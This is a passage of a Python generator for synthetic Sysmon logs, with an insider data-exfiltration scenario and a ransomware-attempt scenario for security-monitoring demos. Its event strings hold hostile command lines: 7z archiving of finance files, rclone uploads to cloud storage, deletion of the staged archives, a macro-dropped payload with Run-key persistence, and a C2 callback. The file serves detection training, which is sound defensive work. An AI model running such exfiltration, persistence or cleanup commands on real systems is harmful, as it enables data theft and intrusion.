                                  "tcp", alex_ip, random.randint(49152, 65535),
                                  "10.10.20.20", 445, demo_id=demo_id))

        # File created on staging area
        ts = ts.replace(minute=12, second=45)
        events.append(sysmon_eid11(ts, alex_computer, alex_user,
                                   "C:\\Users\\amiller\\AppData\\Local\\Temp\\7z.exe",
                                   "C:\\Users\\amiller\\AppData\\Local\\Temp\\data_batch_1.zip",
                                   demo_id=demo_id))

    if day == 10 and hour == 3:
        # More data staging batches
        for batch_num in range(2, 5):
            ts = date_add(base_date, day).replace(hour=3, minute=10 + batch_num * 8, second=random.randint(0, 59))
            events.append(sysmon_eid1(ts, alex_computer, alex_user,
                                      "C:\\Users\\amiller\\AppData\\Local\\Temp\\7z.exe",
                                      f'7z.exe a -pS3cur3P@ss data_batch_{batch_num}.zip "C:\\Users\\amiller\\Documents\\Finance\\Q4_*"',
                                      parent_image="C:\\Windows\\System32\\cmd.exe",
                                      demo_id=demo_id))

            ts = ts.replace(second=random.randint(0, 59))
            events.append(sysmon_eid11(ts, alex_computer, alex_user,
                                       "C:\\Users\\amiller\\AppData\\Local\\Temp\\7z.exe",
                                       f"C:\\Users\\amiller\\AppData\\Local\\Temp\\data_batch_{batch_num}.zip",
                                       demo_id=demo_id))

    # =========================================================================
    # Day 11-13: Exfiltration
    # =========================================================================
    if day == 11 and hour == 1:
        # rclone for cloud exfil
        ts = date_add(base_date, day).replace(hour=1, minute=15, second=10)
        events.append(sysmon_eid1(ts, alex_computer, alex_user,
                                  "C:\\Users\\amiller\\AppData\\Local\\Temp\\rclone.exe",
                                  'rclone.exe copy "C:\\Users\\amiller\\AppData\\Local\\Temp\\data_batch_1.zip" gdrive:backup/finance/',
                                  parent_image="C:\\Windows\\System32\\cmd.exe",
                                  demo_id=demo_id))

        # DNS to cloud storage
        ts = ts.replace(minute=15, second=25)
        events.append(sysmon_eid22(ts, alex_computer, alex_user,
                                   "C:\\Users\\amiller\\AppData\\Local\\Temp\\rclone.exe",
                                   "storage.googleapis.com",
                                   query_results="::ffff:35.186.224.25;",
                                   demo_id=demo_id))

        ts = ts.replace(minute=15, second=40)
        events.append(sysmon_eid22(ts, alex_computer, alex_user,
                                   "C:\\Users\\amiller\\AppData\\Local\\Temp\\rclone.exe",
                                   "s3.amazonaws.com",
                                   query_results="::ffff:54.239.28.85;",
                                   demo_id=demo_id))

        # Network to GCP
        ts = ts.replace(minute=16, second=5)
        events.append(sysmon_eid3(ts, alex_computer, alex_user,
                                  "C:\\Users\\amiller\\AppData\\Local\\Temp\\rclone.exe",
                                  "tcp", alex_ip, random.randint(49152, 65535),
                                  "35.186.224.25", 443, demo_id=demo_id))

        # Network to Azure (alternate exfil path)
        ts = ts.replace(minute=18, second=30)
        events.append(sysmon_eid3(ts, alex_computer, alex_user,
                                  "C:\\Users\\amiller\\AppData\\Local\\Temp\\rclone.exe",
                                  "tcp", alex_ip, random.randint(49152, 65535),
                                  "52.239.228.100", 443, demo_id=demo_id))

    if day == 12 and hour == 2:
        # More exfil batches
        for batch_num in range(2, 4):
            ts = date_add(base_date, day).replace(hour=2, minute=10 + batch_num * 12, second=random.randint(0, 59))
            events.append(sysmon_eid1(ts, alex_computer, alex_user,
                                      "C:\\Users\\amiller\\AppData\\Local\\Temp\\rclone.exe",
                                      f'rclone.exe copy "C:\\Users\\amiller\\AppData\\Local\\Temp\\data_batch_{batch_num}.zip" gdrive:backup/finance/',
                                      parent_image="C:\\Windows\\System32\\cmd.exe",
                                      demo_id=demo_id))

            ts = ts.replace(second=random.randint(0, 59))
            events.append(sysmon_eid3(ts, alex_computer, alex_user,
                                      "C:\\Users\\amiller\\AppData\\Local\\Temp\\rclone.exe",
                                      "tcp", alex_ip, random.randint(49152, 65535),
                                      "35.186.224.25", 443, demo_id=demo_id))

        # Finance CSV export
        ts = date_add(base_date, day).replace(hour=2, minute=50, second=15)
        events.append(sysmon_eid11(ts, alex_computer, alex_user,
                                   "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
                                   "C:\\Users\\amiller\\Documents\\finance_export_final.csv",
                                   demo_id=demo_id))

    if day == 13 and hour == 1:
        # Final exfil batch
        ts = date_add(base_date, day).replace(hour=1, minute=30, second=22)
        events.append(sysmon_eid1(ts, alex_computer, alex_user,
                                  "C:\\Users\\amiller\\AppData\\Local\\Temp\\rclone.exe",
                                  'rclone.exe copy "C:\\Users\\amiller\\AppData\\Local\\Temp\\data_batch_4.zip" gdrive:backup/finance/',
                                  parent_image="C:\\Windows\\System32\\cmd.exe",
                                  demo_id=demo_id))

        ts = ts.replace(minute=31, second=5)
        events.append(sysmon_eid3(ts, alex_computer, alex_user,
                                  "C:\\Users\\amiller\\AppData\\Local\\Temp\\rclone.exe",
                                  "tcp", alex_ip, random.randint(49152, 65535),
                                  "35.186.224.25", 443, demo_id=demo_id))

        # Cleanup attempt
        ts = ts.replace(minute=45, second=10)
        events.append(sysmon_eid1(ts, alex_computer, alex_user,
                                  "C:\\Windows\\System32\\cmd.exe",
                                  'cmd.exe /c del /q "C:\\Users\\amiller\\AppData\\Local\\Temp\\data_batch_*.zip"',
                                  demo_id=demo_id))

    return events


# =============================================================================
# SCENARIO: RANSOMWARE ATTEMPT (Day 7-8)
# =============================================================================

def generate_ransomware_events(base_date: str, day: int, hour: int) -> List[str]:
    """Generate ransomware attempt Sysmon events for a specific day/hour."""
    events = []

    # Ransomware config
    target_computer = "AUS-WS-BWHITE01"
    target_ip = "10.30.30.20"
    target_user = f"{DOMAIN_PREFIX}\\brooklyn.white"
    c2_ip = "194.26.29.42"
    malware_name = "svchost_update.exe"
    malware_path = "C:\\Users\\bwhite\\AppData\\Local\\Temp\\svchost_update.exe"
    phishing_attachment = "Invoice_Q4_2026.docm"

    demo_id = "ransomware_attempt"

    # All events on Day 7 (start_day=7, 0-indexed)
    if day != 7:
        return events

    # 14:02 - Word opens malicious document
    if hour == 14:
        ts = date_add(base_date, day).replace(hour=14, minute=2, second=10)
        events.append(sysmon_eid1(ts, target_computer, target_user,
                                  "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                                  f'"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n "C:\\Users\\bwhite\\Downloads\\{phishing_attachment}"',
                                  demo_id=demo_id))

        # 14:02 - Malware dropped by macro
        ts = ts.replace(second=35)
        events.append(sysmon_eid11(ts, target_computer, target_user,
                                   "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                                   malware_path,
                                   demo_id=demo_id))

        # 14:03 - Malware executes (parent = WINWORD.EXE)
        ts = ts.replace(minute=3, second=5)
        events.append(sysmon_eid1(ts, target_computer, target_user,
                                  malware_path,
                                  malware_path,
                                  parent_image="C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                                  parent_command_line=f'"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n "C:\\Users\\bwhite\\Downloads\\{phishing_attachment}"',
                                  demo_id=demo_id))

        # 14:03 - Registry persistence (Run key)
        ts = ts.replace(second=30)
        events.append(sysmon_eid13(ts, target_computer, target_user,
                                   malware_path,
                                   "SetValue",
                                   "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate",
                                   malware_path,
                                   demo_id=demo_id))

        # 14:04 - DNS to C2 domain
        ts = ts.replace(minute=4, second=10)
        events.append(sysmon_eid22(ts, target_computer, target_user,
                                   malware_path,
                                   "update-check-service.ru",
                                   query_results=f"::ffff:{c2_ip};",
                                   demo_id=demo_id))

        # 14:05 - C2 callback
        ts = ts.replace(minute=5, second=2)
        events.append(sysmon_eid3(ts, target_computer, target_user,
                                  malware_path,
                                  "tcp", target_ip, random.randint(49152, 65535),
                                  c2_ip, 443, demo_id=demo_id))

        # 14:08-10 - Lateral movement attempts (SMB)
        lateral_targets = ["10.30.30.21", "10.30.30.22", "10.30.30.40"]
        for i, lateral_ip in enumerate(lateral_targets):
            ts = ts.replace(minute=8 + i, second=random.randint(10, 50))
            events.append(sysmon_eid3(ts, target_computer, target_user,
                                      malware_path,
                                      "tcp", target_ip, random.randint(49152, 65535),
                                      lateral_ip, 445, demo_id=demo_id))

        # 14:11 - Ransom note dropped
        ts = ts.replace(minute=11, second=15)
        events.append(sysmon_eid11(ts, target_computer, target_user,
                                   malware_path,
                                   "C:\\Users\\bwhite\\Desktop\\README_DECRYPT.txt",
                                   demo_id=demo_id))

        # 14:12 - Windows Defender scan triggered
        ts = ts.replace(minute=12, second=5)
        events.append(sysmon_eid1(ts, target_computer, SYSTEM_USER,
                                  "C:\\Program Files\\Windows Defender\\MpCmdRun.exe",
                                  '"C:\\Program Files\\Windows Defender\\MpCmdRun.exe" -Scan -ScanType 3',
                                  demo_id=demo_id))

        # 14:12 - Defender network connection (telemetry)
        ts = ts.replace(second=30)
        events.append(sysmon_eid3(ts, target_computer, SYSTEM_USER,
                                  "C:\\Program Files\\Windows Defender\\MpCmdRun.exe",
                                  "tcp", target_ip, random.randint(49152, 65535),
                                  "13.107.42.14", 443, demo_id=demo_id))

    return events


# =============================================================================
# MAIN GENERATOR
# =============================================================================

def generate_sysmon_logs(
    start_date: str = DEFAULT_START_DATE,
    days: int = DEFAULT_DAYS,
    scale: float = DEFAULT_SCALE,
    scenarios: str = "none",
    output_dir: str = None,
    progress_callback=None,
    quiet: bool = False,
    num_clients: int = 0,
) -> int:
    """Generate Sysmon operational log events.

    Args:
        start_date: Start date (YYYY-MM-DD)
        days: Number of days to generate
        scale: Volume scale factor
        scenarios: Scenario spec ("none", "all", "exfil", etc.)
        output_dir: Override output directory
        quiet: Suppress progress output
        num_clients: Number of client workstations (0=legacy 20-sample)

    Returns:
        Total event count
    """
    # Determine output path
    if output_dir:
        output_path = Path(output_dir) / "windows" / FILE_SYSMON
    else:
        output_path = get_output_path("windows", FILE_SYSMON)

    output_path.parent.mkdir(parents=True, exist_ok=True)

    # Parse scenarios
    active_scenarios = expand_scenarios(scenarios)
    run_exfil = "exfil" in active_scenarios
    run_ransomware = "ransomware_attempt" in active_scenarios

    # Build client list (replaces sampled workstations when num_clients > 0)
    if num_clients > 0:
        from generators.generate_wineventlog import build_wineventlog_client_list
        clients = build_wineventlog_client_list(num_clients)
    else:
        clients = None  # Use legacy sampled workstations

    if not quiet:
        client_info = f", clients={num_clients}" if num_clients > 0 else ""
        print(f"[sysmon] Generating {days} days from {start_date} (scale={scale}{client_info})")
        if active_scenarios:
            print(f"[sysmon] Active scenarios: {', '.join(active_scenarios)}")

    all_events = []

    for day in range(days):
        if progress_callback:
            progress_callback("sysmon", day + 1, days)
        day_events = []

        # Select legacy workstations if no explicit client list
        if clients is None:
            workstations = select_sampled_workstations(day, count=20)

        for hour in range(24):
            # Calculate events per server for this hour
            server_count = calc_natural_events(
                int(SERVER_BASE_EVENTS_PER_HOUR * scale),
                start_date, day, hour, "windows"
            )

            # Generate server baseline
            for srv_name, srv_info in SYSMON_SERVERS.items():
                srv_events = generate_baseline_server_hour(
                    start_date, day, hour, srv_name, srv_info, server_count
                )
                day_events.extend(srv_events)

            # ===== CLIENT WORKSTATION EVENTS =====
            if clients is not None:
                # Configurable client scaling (--clients=N)
                for client in clients:
                    client_events = generate_client_sysmon_hour(
                        start_date, day, hour, client, scale
                    )
                    day_events.extend(client_events)
            else:
                # Legacy: fixed 20-workstation sampling
                ws_count = calc_natural_events(
                    int(WORKSTATION_BASE_EVENTS_PER_HOUR * scale),
                    start_date, day, hour, "windows"
                )
                for user_obj in workstations:
                    ws_events = generate_baseline_workstation_hour(
                        start_date, day, hour, user_obj, ws_count
                    )
                    day_events.extend(ws_events)

            # Scenario events
            if run_exfil and 4 <= day <= 13:
                exfil_events = generate_exfil_events(start_date, day, hour)
                day_events.extend(exfil_events)

            if run_ransomware and day == 7:
                ransom_events = generate_ransomware_events(start_date, day, hour)
                day_events.extend(ransom_events)

        all_events.extend(day_events)

        if not quiet:
            dt = date_add(start_date, day)
            day_name = dt.strftime("%a")
            print(f"  Day {day:2d} ({day_name}): {len(day_events):,} events")

    # Sort by timestamp (extracted from first line of each KV event)
    all_events.sort(key=_extract_timestamp)

    # Write output
    with open(output_path, "w", encoding="utf-8") as f:
        for event in all_events:
            f.write(event + "\n")

    total = len(all_events)
    if not quiet:
        print(f"[sysmon] Total: {total:,} events written to {output_path}")

    return {"total": total, "files": {"windows/sysmon_operational.log": total}}


def _extract_timestamp(event_block: str) -> str:
    """Extract timestamp from first line of KV event for sorting.

    First line is: MM/DD/YYYY HH:MM:SS AM/PM
    Convert to sortable format: YYYY-MM-DD HH:MM:SS (24h)
    """
    first_line = event_block.split("\n", 1)[0].strip()
    try:
        dt = datetime.strptime(first_line, "%m/%d/%Y %I:%M:%S %p")
        return dt.strftime("%Y-%m-%d %H:%M:%S")
    except (ValueError, IndexError):
        return ""


# =============================================================================
# CLI
# =============================================================================

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Generate Sysmon operational logs")
    parser.add_argument("--start-date", default=DEFAULT_START_DATE)
    parser.add_argument("--days", type=int, default=DEFAULT_DAYS)
    parser.add_argument("--scale", type=float, default=DEFAULT_SCALE)
    parser.add_argument("--scenarios", default="none")
    parser.add_argument("--output-dir", default=None)
    parser.add_argument("--quiet", action="store_true")
    parser.add_argument("--clients", type=int, default=0,
                        help="Number of client workstations (0=legacy 20-sample, max 175)")
    args = parser.parse_args()

    count = generate_sysmon_logs(
        start_date=args.start_date,
        days=args.days,
        scale=args.scale,
        scenarios=args.scenarios,
        output_dir=args.output_dir,
        quiet=args.quiet,
        num_clients=args.clients,
    )
    print(f"\nGenerated {count:,} Sysmon events")
